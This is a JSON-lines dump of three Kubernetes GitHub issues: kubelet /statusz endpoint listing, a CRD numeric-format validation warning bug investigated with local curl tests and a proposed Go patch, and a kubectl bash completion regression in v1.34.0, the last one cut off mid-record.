{"repo": "kubernetes/kubernetes", "issue_number": 133184, "issue_url": "https://github.com/kubernetes/kubernetes/issues/133184", "issue_title": "List available endpoints for kubelet's /statusz", "issue_author": "richabanker", "issue_body": "Sub-issue of https://github.com/kubernetes/kubernetes/issues/132474\n\nAdd additional text of \"Paths:\" with available paths of kubelet:\n\n\"/livez\"\n\"/readyz\"\n\"/healthz\"\n\"/metrics\"\n\n/sig instrumentation\n/triage accepted\n/help", "issue_labels": ["help wanted", "sig/instrumentation", "good first issue", "triage/accepted"], "comments": [{"author": "k8s-ci-robot", "body": "@richabanker: \n\tThis request has been marked as needing help from a contributor.\n\n### Guidelines\nPlease ensure that the issue body includes answers to the following questions:\n- Why are we solving this issue?\n- To address this issue, are there any code changes? If there are code changes, what needs to be done in the code and what places can the assignee treat as reference points?\n- How can the assignee reach out to you for help?\n\n\nFor more details on the requirements of such an issue, please see [here](https://www.kubernetes.dev/docs/guide/help-wanted/) and ensure that they are met.\n\nIf this request no longer meets these requirements, the label can be removed\nby commenting with the `/remove-help` command.\n\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/133184):\n\n>Sub-issue of https://github.com/kubernetes/kubernetes/issues/132474\n>\n>Add additional text of \"Paths:\" with available paths of kube-controller-manager:\n>\n>\"/livez\"\n>\"/readyz\"\n>\"/healthz\"\n>\"/metrics\"\n>\n>/sig instrumentation\n>/triage accepted\n>/help\n>/good first issue\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "richabanker", "body": "/good-first-issue"}, {"author": "k8s-ci-robot", "body": "@richabanker: \n\tThis request has been marked as suitable for new contributors.\n\n### Guidelines\nPlease ensure that the issue body includes answers to the following questions:\n- Why are we solving this issue?\n- To address this issue, are there any code changes? If there are code changes, what needs to be done in the code and what places can the assignee treat as reference points?\n- How can the assignee reach out to you for help?\n\n\nFor more details on the requirements of such an issue, please see [here](https://www.kubernetes.dev/docs/guide/help-wanted/#good-first-issue) and ensure that they are met.\n\nIf this request no longer meets these requirements, the label can be removed\nby commenting with the `/remove-good-first-issue` command.\n\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/133184):\n\n>/good-first-issue\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "Peac36", "body": "/assign"}, {"author": "Yash-xoxo", "body": "**Code Changes Required:**\nThis is a documentation-only change. The work is to insert text with \"Paths:\" followed by the endpoints that are available:\n\n/livez - Liveness endpoint\n/readyz - Readiness endpoint\n/healthz - Health endpoint (deprecated but remains supported)\n/metrics - Metrics endpoint\n\n**Reference Points:**\n\nThe primary kube-controller-manager documentation page\nComparable documentation patterns utilized for other Kubernetes components\nThe documentation on health endpoints at kubernetes.io/docs/reference/using-api/health-checks/\n\n**Technical Context:**\nThe described endpoints have different functions:\n\n/healthz is the older health check endpoint\n/livez reports whether the component is alive and responsive\n/readyz reports whether the component is ready to handle requests\n/metrics serves up Prometheus-style metrics for monitoring\n\nThis is flagged as a good first issue because it's a simple doc update which doesn't need intimate knowledge of the codebase, only familiarity with where to put the doc and following existing conventions."}, {"author": "limitless-100", "body": "@richabanker is this issue still open to new contributors?"}, {"author": "anuragkhuntia", "body": "/assign\n"}, {"author": "ninglonglong", "body": "/assign\n\n\n"}, {"author": "AnjaliMishra1st", "body": "Hi, I\u2019m participating in GirlScript Summer of Code 2025 (GSSoC).\nI\u2019d like to work on this issue as part of my contribution. Could you please assign it to me? \ud83d\ude4f\n"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 133880, "issue_url": "https://github.com/kubernetes/kubernetes/issues/133880", "issue_title": "CRD validation warning on valid formats", "issue_author": "mjlshen", "issue_body": "### What happened?\n\nIn #132532 and #133136 a warning was added for unrecognized formats. However, the `int32`, `int64`, `float`, and `double` formats are flagged ~~and this conflicts with public docs: https://kubernetes.io/docs/tasks/extend-kubernetes/custom-resources/custom-resource-definitions/#format which say that these values are supported formats~~. I believe this is also unintended behavior because there are no other formats that support numbers.\n\n```bash\n\u276f kubectl apply -f https://raw.githubusercontent.com/kro-run/kro/refs/heads/main/helm/crds/kro.run_resourcegraphdefinitions.yaml\nWarning: unrecognized format \"int32\"\nWarning: unrecognized format \"int64\"\ncustomresourcedefinition.apiextensions.k8s.io/resourcegraphdefinitions.kro.run created\n```\n\n### What did you expect to happen?\n\nI expect that applying CRDs containing with `int32`, `int64`, `float`, and `double` formats to be accepted without warnings\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\n```yaml\n# crd.yaml\n---\napiVersion: apiextensions.k8s.io/v1\nkind: CustomResourceDefinition\nmetadata:\n  name: warningformats.example.com\nspec:\n  group: example.com\n  names:\n    kind: WarningFormat\n    listKind: WarningFormatList\n    plural: warningformats\n    singular: warningformat\n  scope: Cluster\n  versions:\n  - name: v1alpha1\n    schema:\n      openAPIV3Schema:\n        description: WarningFormat is the Schema for the warningformats API\n        properties:\n          apiVersion:\n            description: |-\n              APIVersion defines the versioned schema of this representation of an object.\n              Servers should convert recognized schemas to the latest internal value, and\n              may reject unrecognized values.\n              More info: https://git.k8s.io/community/contributors/devel/sig-architecture/api-conventions.md#resources\n            type: string\n          kind:\n            description: |-\n              Kind is a string value representing the REST resource this object represents.\n              Servers may infer this from the endpoint the client submits requests to.\n              Cannot be updated.\n              In CamelCase.\n              More info: https://git.k8s.io/community/contributors/devel/sig-architecture/api-conventions.md#types-kinds\n            type: string\n          metadata:\n            type: object\n          spec:\n            description: WarningFormatSpec defines the desired state of\n              WarningFormat\n            properties:\n              intThirtyTwo:\n                description: int32 format\n                format: int32\n                type: integer\n              intSixtyFour:\n                description: int64 format\n                format: int64\n                type: integer\n              float:\n                description: float format\n                format: float\n                type: number\n              double:\n                description: double format\n                format: double\n                type: number\n            type: object\n          status:\n            description: WarningFormatStatus defines the observed state\n              of WarningFormat\n            type: object\n        type: object\n    served: true\n    storage: true\n    subresources:\n      status: {}\n```\n\n```bash\n\u276f kubectl apply -f crd.yaml\nWarning: unrecognized format \"double\"\nWarning: unrecognized format \"float\"\nWarning: unrecognized format \"int64\"\nWarning: unrecognized format \"int32\"\ncustomresourcedefinition.apiextensions.k8s.io/warningformats.example.com created\n```\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\n<details>\n\n```console\n\u276f kubectl version\nClient Version: v1.34.0\nKustomize Version: v5.7.1\nServer Version: v1.34.0\n```\n\n</details>\n\n\n### Cloud provider\n\nN/A - reproduced using kind\n\n### OS version\n\n\n\n\n### Install tools\n\n_No response_\n\n### Container runtime (CRI) and version (if applicable)\n\n_No response_\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n\n", "issue_labels": ["kind/bug", "sig/api-machinery", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "mjlshen", "body": "/sig api-machinery\n\nIf this is indeed a bug, I'm happy to take a swing at remediating this as well, though I am not sure what all of the intended allowable formats are."}, {"author": "sbueringer", "body": "@mjlshen I think the linked doc is only about format for print columns not the schema"}, {"author": "sbueringer", "body": "xref apiserver:\n* https://github.com/kubernetes/kubernetes/blob/437a2ad693f71c19cb3554871ad9333852bc1bc7/staging/src/k8s.io/apiextensions-apiserver/pkg/apiserver/validation/formats.go#L33\n\nxref controller-gen\n* https://github.com/kubernetes-sigs/controller-tools/pull/1274\n* https://kubernetes.slack.com/archives/C02MRBMN00Z/p1756919141899299?thread_ts=1756919141.899299&cid=C02MRBMN00Z\n\ncc @JoelSpeed "}, {"author": "sbueringer", "body": "It would be good to get confirmation that the desired behavior of the apiserver is to not support int32 / int64 formats + return warnings. \n\ncontroller-gen did set int32/int64 formats (not double/float). I would change controller-gen to stop doing that, but confirmation would be good.\n\n\ncc @liggitt "}, {"author": "liggitt", "body": "/assign @jpbetz "}, {"author": "mjlshen", "body": "> I think the linked doc is only about format for print columns not the schema\n\nYes, sorry, the linked doc I provided is indeed for print columns \ud83e\udd26 \n\n> https://kubernetes.slack.com/archives/C02MRBMN00Z/p1756919141899299?thread_ts=1756919141.899299&cid=C02MRBMN00Z\n\nAlso noted in this Slack thread, the I think there's a tangent, but similar thing where the apiextensions-apiserver code mentions [`datetime` ](https://github.com/kubernetes/kubernetes/blob/3fa443d89a753bc40e183de81561cc0935889c8e/staging/src/k8s.io/apiextensions-apiserver/pkg/apiserver/validation/formats.go#L60)where kube-openapi allows for [`date-time`](https://github.com/kubernetes/kube-openapi/blob/7fc278399c7f4ea5c23254a18ee3581d6e20e4e6/pkg/validation/validate/type.go#L47)\n\n---\n\nI think there's a basically a gap between string formats and integer/number formats, where the current code in apiextensions-apiserver is only validating various string formats, the various numerical (int/float) formats look to be allowed in [kubernetes/kube-openapi](https://github.com/kubernetes/kube-openapi/blob/7fc278399c7f4ea5c23254a18ee3581d6e20e4e6/pkg/validation/validate/helpers.go#L70-L78). Is the intention that when the type is an integer or number, there's no sense in providing/parsing the format because it isn't providing any additional information?"}, {"author": "liggitt", "body": "> Is the intention that when the type is an integer or number, there's no sense in providing/parsing the format because it isn't providing any additional information?\n\nNo, it was an accident that we only included formats valid for type=string in https://github.com/kubernetes/kubernetes/pull/133136 and warned about other formats.\n\nI think we *do* want to warn if a format is used in combination with a type where it will not actually protect anything.\n\na good test showing when the numeric formats are / are not effective in actually validating anything would help build confidence that we are warning at the correct times\n\n```\n\tintegerFormatInt32  = \"int32\"\n\tintegerFormatInt64  = \"int64\"\n\tintegerFormatUInt32 = \"uint32\"\n\tintegerFormatUInt64 = \"uint64\"\n\n\tnumberFormatFloat32 = \"float32\"\n\tnumberFormatFloat64 = \"float64\"\n\tnumberFormatFloat   = \"float\"\n\tnumberFormatDouble  = \"double\"\n```\n\nI *think* the `*int*` formats only enforce when `type=integer`, and the `float*`/`double` formats only enforce when `type=number` (https://github.com/kubernetes/kubernetes/blob/55e8cdeb95abaa2b96b15686e16b5033b414f4a0/vendor/k8s.io/kube-openapi/pkg/validation/validate/values.go#L351-L377), but  a test to demonstrate that would be helpful."}, {"author": "jpbetz", "body": "Given the CRD schema from https://github.com/kubernetes/kubernetes/issues/133880, I tried:\n\n## Valid Case\n\n```yaml\n# cr-valid.yaml\napiVersion: example.com/v1alpha1\nkind: WarningFormat\nmetadata:\n  name: warningformat1.example.com\nspec:\n  intThirtyTwo: 2147483647\n  intSixtyFour: 9223372036854775807\n  float: 3.4028235e+38\n  double: 1.7976931348623157e+308\n```\n\n```sh\nkubectl apply -f cr-valid.yaml\n```\n\nAnd got:\n\n```\nThe WarningFormat \"warningformat1.example.com\" is invalid: spec.intSixtyFour: Invalid value: \"number\": spec.intSixtyFour in body must be of type integer: \"number\"\n```\n\nWhich is not what I expected for a field claiming to support int64.\n\n## Invalid Case\n\n```yaml\n# cr-invalid.yaml\napiVersion: example.com/v1alpha1\nkind: WarningFormat\nmetadata:\n  name: warningformat1.example.com\nspec:\n  intThirtyTwo: 2147483648\n  intSixtyFour: 9223372036854775808\n  float: 3.5+38\n  double: 1.8+308\n```\n\n```sh\nkubectl apply -f cr-invalid.yaml\n```\n\nAnd got:\n\n```\nThe WarningFormat \"warningformat1.example.com\" is invalid: \n* spec.double: Invalid value: \"string\": spec.double in body must be of type number: \"string\"\n* spec.float: Invalid value: \"string\": spec.float in body must be of type number: \"string\"\n* spec.intSixtyFour: Invalid value: \"number\": spec.intSixtyFour in body must be of type integer: \"number\"\n```\n\nWhich appears to be missing a validation error for `intThirtyTwo`."}, {"author": "liggitt", "body": "> Given the CRD schema from [#133880](https://github.com/kubernetes/kubernetes/issues/133880), I tried:\n> \n> ## Valid Case\n> # cr-valid.yaml\n> apiVersion: example.com/v1alpha1\n> kind: WarningFormat\n> metadata:\n>   name: warningformat1.example.com\n> spec:\n>   intThirtyTwo: 2147483647\n>   intSixtyFour: 9223372036854775807\n>   float: 3.4028235e+38\n>   double: 1.7976931348623157e+308\n> kubectl apply -f cr-valid.yaml\n> And got:\n> \n> ```\n> The WarningFormat \"warningformat1.example.com\" is invalid: spec.intSixtyFour: Invalid value: \"number\": spec.intSixtyFour in body must be of type integer: \"number\"\n> ```\n\nCheck what's going across the wire for that (--v=9 or something). I suspect the client-side yaml \u2192 json conversion is turning that into a float.\n\nIf so, try formatting it as a json object to avoid client-side yaml \u2192 json being in the mix."}, {"author": "jpbetz", "body": "Oh, good point.  Here's the same tests but without the client in the loop:\n\n## Valid\n\n```json\n{\n  \"apiVersion\": \"example.com/v1alpha1\",\n  \"kind\": \"WarningFormat\",\n  \"metadata\": {\n    \"name\": \"warningformat1.example.com\"\n  },\n  \"spec\": {\n    \"intThirtyTwo\": 2147483647,\n    \"intSixtyFour\": 9223372036854776000,\n    \"float\": 3.4028235e+38,\n    \"double\": 1.7976931348623157e+308\n  }\n}\n```\n\n```sh\ncurl -X POST -H \"Content-Type: application/json\" --data-binary @cr-valid.json \"http://localhost:8001/apis/example.com/v1alpha1/warningformats/warningformat1.example.com\"\n```\n\n```json\n{\n  \"kind\": \"Status\",\n  \"apiVersion\": \"v1\",\n  \"metadata\": {},\n  \"status\": \"Failure\",\n  \"message\": \"WarningFormat.example.com \\\"warningformat1.example.com\\\" is invalid: spec.intSixtyFour: Invalid value: \\\"number\\\": spec.intSixtyFour in body must be of type integer: \\\"number\\\"\",\n  \"reason\": \"Invalid\",\n  \"details\": {\n    \"name\": \"warningformat1.example.com\",\n    \"group\": \"example.com\",\n    \"kind\": \"WarningFormat\",\n    \"causes\": [\n      {\n        \"reason\": \"FieldValueTypeInvalid\",\n        \"message\": \"Invalid value: \\\"number\\\": spec.intSixtyFour in body must be of type integer: \\\"number\\\"\",\n        \"field\": \"spec.intSixtyFour\"\n      }\n    ]\n  },\n  \"code\": 422\n}\n```\n\n## Invalid\n\n```json\n{\n  \"apiVersion\": \"example.com/v1alpha1\",\n  \"kind\": \"WarningFormat\",\n  \"metadata\": {\n    \"name\": \"warningformat1.example.com\"\n  },\n  \"spec\": {\n    \"intThirtyTwo\": 2147483648,\n    \"intSixtyFour\": 9223372036854776000,\n    \"float\": 3.5e38,\n    \"double\": 1.8e308\n  }\n}\n```\n\n```sh\ncurl -X POST -H \"Content-Type: application/json\" --data-binary @cr-invalid.json \"http://localhost:8001/apis/example.com/v1alpha1/warningformats/warningformat1.example.com\" \n```\n\n```json\n{\n  \"kind\": \"Status\",\n  \"apiVersion\": \"v1\",\n  \"metadata\": {},\n  \"status\": \"Failure\",\n  \"message\": \"WarningFormat in version \\\"v1alpha1\\\" cannot be handled as a WarningFormat: json: cannot unmarshal number 1.8e308 into Go value of type float64\",\n  \"reason\": \"BadRequest\",\n  \"code\": 400\n}\n```"}, {"author": "jpbetz", "body": "If I remove the double field from the invalid case I instead get this error:\n\n```json\n{\n  \"apiVersion\": \"example.com/v1alpha1\",\n  \"kind\": \"WarningFormat\",\n  \"metadata\": {\n    \"name\": \"warningformat1.example.com\"\n  },\n  \"spec\": {\n    \"intThirtyTwo\": 2147483648,\n    \"intSixtyFour\": 9223372036854776000,\n    \"float\": 3.5e38\n  }\n}\n```\n\n```sh\ncurl -X POST -H \"Content-Type: application/json\" --data-binary @cr-invalid.json \"http://localhost:8001/apis/example.com/v1alpha1/warningformats/warningformat1.example.com\"\n```\n\n```json\n{\n  \"kind\": \"Status\",\n  \"apiVersion\": \"v1\",\n  \"metadata\": {},\n  \"status\": \"Failure\",\n  \"message\": \"WarningFormat.example.com \\\"warningformat1.example.com\\\" is invalid: spec.intSixtyFour: Invalid value: \\\"number\\\": spec.intSixtyFour in body must be of type integer: \\\"number\\\"\",\n  \"reason\": \"Invalid\",\n  \"details\": {\n    \"name\": \"warningformat1.example.com\",\n    \"group\": \"example.com\",\n    \"kind\": \"WarningFormat\",\n    \"causes\": [\n      {\n        \"reason\": \"FieldValueTypeInvalid\",\n        \"message\": \"Invalid value: \\\"number\\\": spec.intSixtyFour in body must be of type integer: \\\"number\\\"\",\n        \"field\": \"spec.intSixtyFour\"\n      }\n    ]\n  },\n  \"code\": 422\n}"}, {"author": "jpbetz", "body": "If I'm reading this right, we do have actual gaps in validation:\n- Out of range number/float is not validated\n- Out of range integer/int32 is not validated\n\nThat is,  this resource can be created and read back:\n\n```\n{\n  \"apiVersion\": \"example.com/v1alpha1\",\n  \"kind\": \"WarningFormat\",\n  \"metadata\": {\n    \"name\": \"warningformat1.example.com\"\n  },\n  \"spec\": {\n    \"intThirtyTwo\": 2147483648,\n    \"float\": 3.5e38\n  }\n}\n```"}, {"author": "liggitt", "body": "did you change the int64 in the valid case accidentally?\n\n> Valid\n> \n> \"intSixtyFour\": 9223372036854776000,\n\nmax int64 is `9223372036854775807`\n\nI think the \"valid\" int64 in your example *is* out of range, which means the server will parse it as a double (json is ambiguous, the server [parses as ints until it exceeds int64, then falls back to parsing as a double](https://github.com/kubernetes-sigs/json/blob/2d320260d730f3842fef7b08d9a807bdbc617824/internal/golang/encoding/json/decode.go#L928-L934)).\n\nThat's why the CRD validation of the out-of-range int64 complained about a float (\"number\")."}, {"author": "jpbetz", "body": "Grrr.  The tool I used to convert from yaml to json messed my numbers up.\n\nTrying again:\n\n## Valid\n\n```json\n{\n  \"apiVersion\": \"example.com/v1alpha1\",\n  \"kind\": \"WarningFormat\",\n  \"metadata\": {\n    \"name\": \"warningformat1.example.com\"\n  },\n  \"spec\": {\n    \"intThirtyTwo\": 2147483647,\n    \"intSixtyFour\": 9223372036854775807,\n    \"float\": 3.4028235e38,\n    \"double\": 1.7976931348623157e308\n  }\n}\n```\n\nPASSES\n\n## Invalid\n\n```json\n{\n  \"apiVersion\": \"example.com/v1alpha1\",\n  \"kind\": \"WarningFormat\",\n  \"metadata\": {\n    \"name\": \"warningformat1.example.com\"\n  },\n  \"spec\": {\n    \"intThirtyTwo\": 2147483648,\n    \"intSixtyFour\": 9223372036854775808,\n    \"float\": 3.5e38,\n    \"double\": 1.8e308\n  }\n}\n```\n\nFAILS CORRECTLY  on the double `(\"message\": \"WarningFormat in version \\\"v1alpha1\\\" cannot be handled as a WarningFormat: json: cannot unmarshal number 1.8e308 into Go value of type float64\",)`\n\nWith the double removed FAILS CORRECTLY for the intSixtyFour: `\"\"Invalid value: \\\"number\\\": spec.intSixtyFour in body must be of type integer: \\\"number\\\"\",\"`\n\nWith the intSixtyFour removed, PASSES INCORRECTLY for:\n\n```json\n{\n  \"apiVersion\": \"example.com/v1alpha1\",\n  \"kind\": \"WarningFormat\",\n  \"metadata\": {\n    \"name\": \"warningformat1.example.com\"\n  },\n  \"spec\": {\n    \"intThirtyTwo\": 2147483648,\n    \"float\": 3.5e38\n  }\n}\n```\n\n```json\n{\n  \"apiVersion\": \"example.com/v1alpha1\",\n  \"kind\": \"WarningFormat\",\n  \"metadata\": {\n    \"creationTimestamp\": \"2025-09-04T20:03:28Z\",\n    \"generation\": 1,\n    \"managedFields\": [\n      {\n        \"apiVersion\": \"example.com/v1alpha1\",\n        \"fieldsType\": \"FieldsV1\",\n        \"fieldsV1\": {\n          \"f:spec\": {\n            \".\": {},\n            \"f:float\": {},\n            \"f:intThirtyTwo\": {}\n          }\n        },\n        \"manager\": \"curl\",\n        \"operation\": \"Update\",\n        \"time\": \"2025-09-04T20:03:28Z\"\n      }\n    ],\n    \"name\": \"warningformat1.example.com\",\n    \"resourceVersion\": \"2099\",\n    \"uid\": \"126b58c7-2bd5-40df-9172-71aff1d94339\"\n  },\n  \"spec\": {\n    \"float\": 3.5e+38,\n    \"intThirtyTwo\": 2147483648\n  }\n}\n```\n\n"}, {"author": "liggitt", "body": "> If I'm reading this right, we do have actual gaps in validation:\n> \n> * Out of range number/float is not validated\n> * Out of range integer/int32 is not validated\n\nYeah, that's what it looks like, and what is catching the int64 / double cases doesn't appear to be format validation at all, but unmarshaling / type validation:\n* An integer field > int64 fails int-parsing, so falls back to using float64, which fails type=integer validation.\n* A double field > float64 fails parsing completely, and results in a 400 error and never gets to API validation.\n"}, {"author": "liggitt", "body": "Ok, so I think there's two things needed here:\n\n1. Avoid emitting warnings for `type=integer,format={int32,int64}` and `type=number,format={float,double}` per https://swagger.io/docs/specification/v3_0/data-models/data-types/#:~:text=An%20optional%20format%20keyword (and backport this to 1.34)\n2. Fix number/float and integer/int32 validation (master / 1.35+ only, most likely)"}, {"author": "liggitt", "body": "handling int and number formats distinctly would probably be the most isolated way to do this... possibly something along these lines (not attached to this direction, just trying to keep the change small and isolated for a 1.34 backport):\n\n```diff\ndiff --git a/staging/src/k8s.io/apiextensions-apiserver/pkg/apiserver/validation/formats.go b/staging/src/k8s.io/apiextensions-apiserver/pkg/apiserver/validation/formats.go\nindex c11f1c627a7..4b84c39e018 100644\n--- a/staging/src/k8s.io/apiextensions-apiserver/pkg/apiserver/validation/formats.go\n+++ b/staging/src/k8s.io/apiextensions-apiserver/pkg/apiserver/validation/formats.go\n@@ -88,6 +88,16 @@ func StripUnsupportedFormatsPostProcess(s *spec.Schema) error {\n \treturn legacyPostProcessor(s)\n }\n \n+func getType(s *spec.Schema) string {\n+\tif s == nil || len(s.Type) != 1 {\n+\t\treturn \"\"\n+\t}\n+\treturn s.Type[0]\n+}\n+\n+var supportedIntFormats = map[string]bool{\"int32\": true, \"int64\": true}\n+var supportedNumberFormats = map[string]bool{\"float\": true, \"double\": true}\n+\n // StripUnsupportedFormatsPostProcessorForVersion determines the supported formats at the given compatibility version and\n // sets unsupported formats to empty string.\n func StripUnsupportedFormatsPostProcessorForVersion(compatibilityVersion *version.Version) func(s *spec.Schema) error {\n@@ -96,8 +106,21 @@ func StripUnsupportedFormatsPostProcessorForVersion(compatibilityVersion *versio\n \t\t\treturn nil\n \t\t}\n \n-\t\tnormalized := strings.ReplaceAll(s.Format, \"-\", \"\") // go-openapi default format name normalization\n-\t\tif !supportedFormatsAtVersion(compatibilityVersion).supported.Has(normalized) {\n+\t\tswitch getType(s) {\n+\t\tcase \"integer\":\n+\t\t\tif !supportedIntFormats[s.Format] {\n+\t\t\t\ts.Format = \"\"\n+\t\t\t}\n+\t\tcase \"number\":\n+\t\t\tif !supportedNumberFormats[s.Format] {\n+\t\t\t\ts.Format = \"\"\n+\t\t\t}\n+\t\tcase \"string\", \"\":\n+\t\t\tnormalized := strings.ReplaceAll(s.Format, \"-\", \"\") // go-openapi default format name normalization\n+\t\t\tif !supportedFormatsAtVersion(compatibilityVersion).supported.Has(normalized) {\n+\t\t\t\ts.Format = \"\"\n+\t\t\t}\n+\t\tdefault:\n \t\t\ts.Format = \"\"\n \t\t}\n \n@@ -113,8 +136,21 @@ func GetUnrecognizedFormats(schema *spec.Schema, compatibilityVersion *version.V\n \t\treturn unrecognizedFormats\n \t}\n \n-\tnormalized := strings.ReplaceAll(schema.Format, \"-\", \"\") // go-openapi default format name normalization\n-\tif !supportedFormatsAtVersion(compatibilityVersion).supported.Has(normalized) {\n+\tswitch getType(schema) {\n+\tcase \"integer\":\n+\t\tif !supportedIntFormats[schema.Format] {\n+\t\t\tunrecognizedFormats = append(unrecognizedFormats, schema.Format)\n+\t\t}\n+\tcase \"number\":\n+\t\tif !supportedNumberFormats[schema.Format] {\n+\t\t\tunrecognizedFormats = append(unrecognizedFormats, schema.Format)\n+\t\t}\n+\tcase \"string\", \"\":\n+\t\tnormalized := strings.ReplaceAll(schema.Format, \"-\", \"\") // go-openapi default format name normalization\n+\t\tif !supportedFormatsAtVersion(compatibilityVersion).supported.Has(normalized) {\n+\t\t\tunrecognizedFormats = append(unrecognizedFormats, schema.Format)\n+\t\t}\n+\tdefault:\n \t\tunrecognizedFormats = append(unrecognizedFormats, schema.Format)\n \t}\n \n```"}, {"author": "mjlshen", "body": "Thanks so much for the investigation! Is it ok if I try to push \n> 2. Fix number/float and integer/int32 validation (master / 1.35+ only, most likely)\n\nstarting from @liggitt's suggestion + tests over the finish line? I'll probably be slower than you all, but I can join the next API Machinery SIG meeting if I have any questions"}, {"author": "sbueringer", "body": "> Ok, so I think there's two things needed here:\n> \n> 1. Avoid emitting warnings for `type=integer,format={int32,int64}` and `type=number,format={float,double}` per [swagger.io/docs/specification/v3_0/data-models/data-types#:~:text=An optional format keyword](https://swagger.io/docs/specification/v3_0/data-models/data-types/#:~:text=An%20optional%20format%20keyword) (and backport this to 1.34)\n\n\n@liggitt Just to double check, so for int only int32 and int64 will be valid formats? Just asking because kube-openapi seems to support uint: https://github.com/kubernetes/kubernetes/blob/55e8cdeb95abaa2b96b15686e16b5033b414f4a0/vendor/k8s.io/kube-openapi/pkg/validation/validate/values.go#L353-L364 \n\nOf course doesn't mean kube-apiserver has to or should support uint as well, especially as uint is not in the OpenAPI spec: https://swagger.io/docs/specification/v3_0/data-models/data-types/\n\nSimilar question for float"}, {"author": "liggitt", "body": "> Just asking because kube-openapi seems to support uint:\n\nI agree it *seems* to, but neither @jpbetz nor I could get *any* of those format validations to actually kick in and be effective (not even the int32 and float ones are enforced).\n\nIf none of them are *actually* currently effective, and we'd actually be fixing / adding number format format enforcement, I think we would probably just start with the official ones included in the openapi spec.\n\nThat's why the first step we want to do is to add test coverage to determine what is *actually* being enforced today, format-wise, and go from there."}]}
{"repo": "kubernetes/kubernetes", "issue_number": 133864, "issue_url": "https://github.com/kubernetes/kubernetes/issues/133864", "issue_title": "kubectl bash <TAB> completion seems to be broken in the new release v1.34.0", "issue_author": "Muthukumar-Subramaniam", "issue_body": "### What happened?\n\nThe kubectl command tab completions with bash seems to be broken in the latest release of Kubernetes version v1.34.0 .\nPlease address this issue.\nWhen TAB is pressed for command completion, its going for complete api-resources detail for the object.\n\n----------\n[muthuks@test-k8s-cp1 ~]$ kubectl get deployments\\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ deploy\\ \\ \\ \\ \\ apps/v1\\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ true\\ \\ \\ \\ Deployment ^C\n[muthuks@test-k8s-cp1 ~]$\n---------\n[muthuks@test-k8s-cp1 ~]$ kubectl get pod\npoddisruptionbudgets                pdb        policy/v1                           true    PodDisruptionBudget\npods                                po         v1                                  true    Pod\npodtemplates                                   v1                                  true    PodTemplate\n[muthuks@test-k8s-cp1 ~]$ kubectl get pods\\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ po\\ \\ \\ \\ \\ \\ \\ \\ \\ v1\\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ true\\ \\ \\ \\ Pod\n\n### What did you expect to happen?\n\nIn Previous Release : v1.33.4\n-------------\n[muthuks@tuxops360 ~]$ kubectl get pod\npoddisruptionbudgets.policy  pods                         podtemplates\n-------\n\n-----\n[muthuks@tuxops360 ~]$ kubectl version\nClient Version: v1.33.4\nKustomize Version: v5.6.0\nServer Version: v1.34.0\n[muthuks@tuxops360 ~]$\n-----\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nPlease try to fix the the bash completion issue for kubectl which is broken in release v1.34.0 \n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\n<details>\n\n```console\n[muthuks@test-k8s-cp1 ~]$ kubectl version\nClient Version: v1.34.0\nKustomize Version: v5.7.1\nServer Version: v1.34.0\n[muthuks@test-k8s-cp1 ~]$\n```\n\n</details>\n\n\n### Cloud provider\n\n<details>\nkubeadm based bare metal cluster.\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# On Linux:\n$ cat /etc/os-release\nNAME=\"AlmaLinux\"\nVERSION=\"10.0 (Purple Lion)\"\nID=\"almalinux\"\nID_LIKE=\"rhel centos fedora\"\nVERSION_ID=\"10.0\"\nPLATFORM_ID=\"platform:el10\"\nPRETTY_NAME=\"AlmaLinux 10.0 (Purple Lion)\"\nANSI_COLOR=\"0;34\"\nLOGO=\"fedora-logo-icon\"\nCPE_NAME=\"cpe:/o:almalinux:almalinux:10::baseos\"\nHOME_URL=\"https://almalinux.org/\"\nDOCUMENTATION_URL=\"https://wiki.almalinux.org/\"\nVENDOR_NAME=\"AlmaLinux\"\nVENDOR_URL=\"https://almalinux.org/\"\nBUG_REPORT_URL=\"https://bugs.almalinux.org/\"\n\nALMALINUX_MANTISBT_PROJECT=\"AlmaLinux-10\"\nALMALINUX_MANTISBT_PROJECT_VERSION=\"10.0\"\nREDHAT_SUPPORT_PRODUCT=\"AlmaLinux\"\nREDHAT_SUPPORT_PRODUCT_VERSION=\"10.0\"\nSUPPORT_END=2035-06-01\n\n$ uname -a\nLinux tuxops360.lab.local 6.12.0-55.28.1.el10_0.x86_64 #1 SMP PREEMPT_DYNAMIC Tue Aug 26 07:20:14 